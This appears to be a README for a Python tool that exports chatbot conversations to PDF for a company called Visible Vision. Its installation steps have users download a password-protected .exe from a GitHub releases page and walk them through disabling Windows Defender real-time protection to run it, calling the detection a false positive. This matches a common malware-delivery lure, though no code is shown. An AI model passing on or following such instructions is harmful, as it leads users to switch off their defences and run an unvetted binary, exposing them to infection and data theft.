# Chat Conversation Exporter

The **Chat Conversation Exporter** is a Python-based tool designed for **Visible Vision** to fetch conversations from a chatbot service via API and export them into a `.pdf` file. The application is written in Python and can be converted into a standalone `.exe` file for easy distribution on Windows.

---

## Features

- **API Integration**: Fetches conversations from the chatbot service using the provided API.
- **PDF Export**: Exports conversations into a well-formatted `.pdf` file.
- **User-Friendly GUI**: Built with `tkinter` for an intuitive and easy-to-use interface.
- **Password Protection**: The `.exe` file is secured with a password to ensure only authorized employees can use it.
- **Cross-Platform Compatibility**: Can be converted into a `.exe` file for Windows or a `.app` bundle for macOS.
- **Customizable Export**: Allows filtering and formatting of conversations before export.
- **Progress Tracking**: Displays a progress bar during the export process.

---

## Installation

### Prerequisites

- **Password**: The `.exe` file is password-protected. Contact your administrator for the password.
- **Windows Defender**: The `.exe` file may trigger a false positive detection by antivirus software. Follow the steps below to disable Windows Defender temporarily.

### Steps

1. **Download the `.exe` file**:
   - The latest version of the application can be downloaded from the [Releases](https://github.com/sn1ky/exporter-updates/releases) page.
   - The file is password-protected. Use the password provided by your administrator to extract it.

2. **Disable Windows Defender** (if necessary):
   - The `.exe` file may be flagged as a false positive by antivirus software. To run the application, follow these steps:
     1. Open **Windows Security**.
     2. Go to **Virus & threat protection**.
     3. Click on **Manage settings** under "Virus & threat protection settings".
     4. Temporarily disable **Real-time protection**.
     5. Run the `.exe` file.
     6. Re-enable **Real-time protection** after use.

3. **Run the application**:
   - Double-click the `.exe` file to launch the application.

---

## Usage

1. **Launch the application**:
   - Run the `.exe` file.

2. **Select a chatbot**:
   - Choose a chatbot from the dropdown menu or manually enter the chatbot ID.

3. **Export conversations**:
   - Click the "Export" button to fetch and export conversations to a `.pdf` file.

4. **View the output**:
   - The exported `.pdf` file will be saved in the same directory as the application.

---

## Acknowledgments

- **Visible Vision** for providing the API and use case.
- The Python community for amazing libraries like `requests`, `fpdf2`, and `tkinter`.

---

## Contact

For questions or feedback, feel free to reach out:

- **Email**: martin.hron@visiblevision.cz
- **GitHub**: [sn1ky](https://github.com/sn1ky)
